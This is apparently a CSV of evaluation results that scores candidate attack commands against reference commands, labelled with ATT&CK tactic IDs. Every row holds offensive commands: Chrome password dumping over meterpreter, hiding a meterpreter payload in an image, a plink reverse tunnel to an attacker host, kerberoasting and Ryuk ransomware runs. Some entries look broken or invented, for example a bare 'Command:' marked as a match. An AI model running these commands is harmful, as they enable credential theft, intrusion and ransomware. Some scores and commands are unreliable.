file,tool,input_command,matched_command,edit_score,match_found
command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.404,True
command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.091,True
command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.45,True
command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,0.282,True
command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,0.565,True
command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,0.658,True
